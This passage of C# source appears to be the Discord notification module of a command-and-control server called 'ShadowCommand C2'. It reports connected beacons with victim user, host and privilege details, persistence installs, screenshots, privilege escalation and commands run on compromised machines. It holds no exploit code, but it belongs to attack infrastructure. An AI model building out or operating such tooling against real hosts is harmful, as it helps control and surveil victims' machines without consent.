                    $"**File:** {filename}\n**Beacon:** {beaconId}\n**Operation:** {operation}",
                    color
                );
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending file operation notification: {ex.Message}");
            }
        }

        // Send build notification
        public async Task NotifyClientBuild(string serverIp, int port, bool success = true)
        {
            try
            {
                string emoji = success ? "🔨" : "❌";
                string status = success ? "completed successfully" : "failed";
                string color = success ? "00FF00" : "FF0000";

                await SendStatusUpdate(
                    $"{emoji} Client build {status}",
                    $"**Server IP:** {serverIp}\n**Port:** {port}\n**Status:** Build {status}",
                    color
                );
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending build notification: {ex.Message}");
            }
        }

        // Send persistence notification
        public async Task NotifyPersistence(string beaconId, string method, bool success = true)
        {
            try
            {
                string emoji = success ? "🔒" : "❌";
                string status = success ? "installed successfully" : "installation failed";
                string color = success ? "FFA500" : "FF0000"; // Orange for persistence, red for failure

                await SendStatusUpdate(
                    $"{emoji} Persistence {status}",
                    $"**Beacon:** {beaconId}\n**Method:** {method}\n**Status:** {status}",
                    color
                );
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending persistence notification: {ex.Message}");
            }
        }

        // Send screenshot notification
        public async Task NotifyScreenshot(string beaconId, bool success = true)
        {
            try
            {
                string emoji = success ? "📸" : "❌";
                string status = success ? "captured successfully" : "capture failed";
                string color = success ? "0099FF" : "FF0000"; // Blue for screenshot, red for failure

                await SendStatusUpdate(
                    $"{emoji} Screenshot {status}",
                    $"**Beacon:** {beaconId}\n**Status:** Screenshot {status}\n**Location:** Server downloads directory",
                    color
                );
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending screenshot notification: {ex.Message}");
            }
        }

        // Send privilege escalation notification
        public async Task NotifyPrivilegeEscalation(string beaconId, string method, bool success = true)
        {
            try
            {
                string emoji = success ? "👑" : "❌";
                string status = success ? "successful" : "failed";
                string color = success ? "FFD700" : "FF0000"; // Gold for privilege escalation, red for failure

                await SendStatusUpdate(
                    $"{emoji} Privilege escalation {status}",
                    $"**Beacon:** {beaconId}\n**Method:** {method}\n**Status:** Escalation {status}",
                    color
                );
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending privilege escalation notification: {ex.Message}");
            }
        }

        public async Task NotifyBeaconConnection(ClientHandler client, bool connected = true)
        {
            if (!_discordNotificationsEnabled || !IsConfigured)
                return;

            try
            {
                string emoji = connected ? "🟢" : "🔴";
                string status = connected ? "Connected" : "Disconnected";
                string color = connected ? "00FF00" : "FF0000";

                // Wait for system info if connecting
                if (connected)
                {
                    if (!client.IsEncrypted)
                    {
                        await Task.Delay(3000);
                    }
                    else
                    {
                        await Task.Delay(2000);
                    }
                }

                string privilegeText;
                string privilegeEmoji;

                if (client.UserName?.EndsWith("$") == true)
                {
                    // Computer account
                    privilegeText = "Computer Account (High Privilege)";
                    privilegeEmoji = "🖥️";
                }
                else if (client.UserName?.Contains("SYSTEM") == true || client.UserName?.Contains("NT AUTHORITY") == true)
                {
                    // System account
                    privilegeText = "SYSTEM Account";
                    privilegeEmoji = "⚡";
                }
                else if (client.IsAdmin)
                {
                    // Regular admin user
                    privilegeText = "Administrator";
                    privilegeEmoji = "👑";
                }
                else
                {
                    // Standard user
                    privilegeText = "Standard User";
                    privilegeEmoji = "👤";
                }

                var embed = new
                {
                    embeds = new[]
                    {
                new
                {
                    title = $"{emoji} Beacon {status}",
                    color = Convert.ToInt32(color, 16),
                    fields = new[]
                    {
                        new { name = "🆔 Beacon ID", value = client.ClientId, inline = true },
                        new { name = "🌍 IP Address", value = client.ClientInfo, inline = true },
                        new { name = "🔐 Connection", value = client.IsEncrypted ?
                            $"🔒 Encrypted (TLS {client.TlsProtocol})" :
                            "🔓 Plain Text", inline = true },
                        new { name = "👤 User", value = string.IsNullOrEmpty(client.UserName) ?
                            "Gathering..." : client.UserName, inline = true },
                        new { name = "🖥️ Computer", value = string.IsNullOrEmpty(client.ComputerName) ?
                            "Gathering..." : client.ComputerName, inline = true },
                        new { name = "💻 Operating System", value = string.IsNullOrEmpty(client.OSVersion) ||
                            client.OSVersion == "Unknown" ? "Gathering..." : client.OSVersion, inline = true },
                        new { name = $"{privilegeEmoji} Privileges", value = privilegeText, inline = true },
                        new { name = "🖥️ Shell Type", value = client.ShellType ?? "Unknown", inline = true },
                        new { name = "⏰ Status Time", value = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss UTC"), inline = true }
                    },
                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                    footer = new { text = $"ShadowCommand C2 - {(connected ? "New beacon online" : "Beacon offline")} | Use !help for commands" }
                }
            }
                };

                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages";
                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                string json = JsonSerializer.Serialize(embed);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await _httpClient.PostAsync(url, content);
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error notifying beacon connection: {ex.Message}");
            }
        }
        public async Task LogCommandExecution(string command, string beaconId, string operatorName = "Discord")
        {
            try
            {
                if (!_discordNotificationsEnabled || !IsConfigured)
                    return;

                // Only log important commands to avoid spam
                string[] importantCommands = { "screenshot", "persist", "getsystem", "download", "upload", "kill", "build" };
                string cmdWord = command.Split(' ')[0].ToLower();

                if (importantCommands.Contains(cmdWord))
                {
                    await SendDiscordMessage($"🎯 **Command Executed**\n" +
                                           $"**Operator:** {operatorName}\n" +
                                           $"**Beacon:** {beaconId ?? "None"}\n" +
                                           $"**Command:** `{command}`\n" +
                                           $"**Time:** {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}");
                }
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error logging command execution: {ex.Message}");
            }
        }

        // Server statistics notification
        public async Task SendServerStatistics(int activeBeacons, TimeSpan uptime, int totalConnections)
        {
            try
            {
                if (!_discordNotificationsEnabled || !IsConfigured)
                    return;

                var embed = new
                {
                    embeds = new[]
                    {
                new
                {
                    title = "📊 Server Statistics",
                    color = 0x0099FF, // Blue
                    fields = new[]
                    {
                        new { name = "🎯 Active Beacons", value = activeBeacons.ToString(), inline = true },
                        new { name = "⏰ Uptime", value = $"{uptime.Days}d {uptime.Hours}h {uptime.Minutes}m", inline = true },
                        new { name = "📈 Total Connections", value = totalConnections.ToString(), inline = true }
                    },
                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                    footer = new { text = "ShadowCommand C2 - Statistics Report" }
                }
            }
                };

                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages";
                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                string json = JsonSerializer.Serialize(embed);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await _httpClient.PostAsync(url, content);
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending server statistics: {ex.Message}");
            }
        }

        public void Dispose()
        {
            StopMessagePolling();
            _httpClient?.Dispose();
        }


    }
    public class DiscordCommandEventArgs : EventArgs
    {
        public string Command { get; set; }
        public string AuthorName { get; set; }
        public string AuthorId { get; set; }
        public string MessageId { get; set; }
        public bool IsBuiltIn { get; set; } = false;
    }
}